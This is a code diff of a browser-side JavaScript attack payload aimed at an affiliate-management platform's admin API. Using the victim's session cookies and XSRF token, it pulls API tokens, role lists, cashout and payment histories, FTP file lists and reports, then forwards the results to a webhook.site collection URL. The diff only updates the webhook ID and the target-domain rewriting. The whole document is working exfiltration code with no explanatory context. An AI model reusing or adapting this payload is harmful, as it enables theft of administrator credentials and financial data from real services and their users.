@@ -1,7 +1,7 @@
 
 const dataToSend = {
 };
-var url = "https://webhook.site/bb3e9fcc-4312-4ce0-b936-030fe6201789";
+var url = "https://webhook.site/1eda2dc3-036e-40c6-b534-176eb3e125d2";
 
 function getCookie(name) {
   const cookies = document.cookie.split('; ');
@@ -20,7 +20,7 @@ dataToSend.authenticity_token = getCookie("XSRF-TOKEN-X");
 dataToSend.merchant = getCookie("merchant_id");
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/trackers/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/trackers/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -56,7 +56,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
   
 });
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -95,7 +95,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/trackers/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/trackers/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -133,7 +133,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 });
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -174,7 +174,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/translate_manager/server_marks?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/translate_manager/server_marks?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -192,7 +192,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/profile/api_tokens?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/profile/api_tokens?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -211,7 +211,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/banner_settings?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/banner_settings?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -229,7 +229,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/affiliates/list_of_affiliate_managers?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/affiliates/list_of_affiliate_managers?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -248,7 +248,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/payment_system_lists/allowed_payment_systems?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/payment_system_lists/allowed_payment_systems?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -267,7 +267,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/history_of_limit_changes/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/history_of_limit_changes/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -287,7 +287,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/dashboard/get_stats?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/dashboard/get_stats?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
@@ -307,7 +307,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/dashboard/chart?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/dashboard/chart?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
@@ -328,7 +328,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/dashboard/tops?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/dashboard/tops?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
@@ -347,7 +347,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/roles/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/roles/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
@@ -368,7 +368,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/bookkeepings/list_month_payments?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/bookkeepings/list_month_payments?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -386,7 +386,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/admin/project_settings/admins_with_full_stats_access?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/project_settings/admins_with_full_stats_access?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
@@ -402,7 +402,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 })();
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/observing_of_daily_statistics_players', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/observing_of_daily_statistics_players', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -440,7 +440,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 });
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/affiliate_cashouts/balance/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/balance/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -480,7 +480,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/ftp_files/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/ftp_files/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -518,7 +518,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 });
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/bonuses/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/bonuses/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -555,7 +555,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/affiliate_cashouts/adjustment_history/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/adjustment_history/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -592,7 +592,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/affiliate_cashouts/pending_cashouts/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/pending_cashouts/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -629,7 +629,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 
 
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/articles/list', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/articles/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -669,7 +669,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://"+document.domain.replace("affiliates","affiliates-api")+"/api2/csrf_token?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
+      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/csrf_token?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
       xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
@@ -699,7 +699,7 @@ dataToSend1.report = {
       group_by_player_params: 'all_players',
       per_page:cc
 
-fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/admin/reports/download_report', {
+fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/reports/download_report', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
